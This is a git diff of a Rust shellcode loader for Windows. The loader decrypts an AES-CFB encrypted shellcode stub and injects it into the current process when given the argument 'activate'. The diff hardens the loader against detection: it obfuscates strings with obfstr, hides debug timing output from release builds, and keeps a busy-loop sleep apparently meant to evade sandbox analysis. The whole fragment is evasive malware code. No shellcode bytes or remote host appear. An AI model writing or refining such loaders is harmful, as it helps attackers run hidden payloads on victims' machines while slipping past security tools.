@@ -5,8 +5,10 @@ use cfb_mode::Cfb;
 use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
 use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
 use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
-use std::time::{Instant};
 use obfstr::obfstr;
+
+#[cfg(debug_assertions)]
+use std::time::{Instant};
 
 type Aes128Cfb = Cfb<Aes128>;
 
@@ -57,22 +59,26 @@ fn decrypt_shellcode_stub() -> Vec<u8> {
 }
 
 fn custom_sleep() {
+    #[cfg(debug_assertions)]
     let now = Instant::now();
+
     for _ in 0..100 {
         for _ in 0..100 {
             for _ in 0..100 {
                 for _ in 0..100 {
-                    print!("");
+                    print!("{}", obfstr!(""));
                 }
             }
         }
     }
+
+    #[cfg(debug_assertions)]
     println!("{} {} {}", obfstr!("el@ps3d:"), now.elapsed().as_millis(), obfstr!("ms."));
 }
 
 fn main() {
     let args: Vec<String> = env::args().collect();
-    if args[1] == "activate" {
+    if args[1] == obfstr!("activate") {
         let mut injector = Injector::new(decrypt_shellcode_stub());
         injector.run_in_current_process();
     }
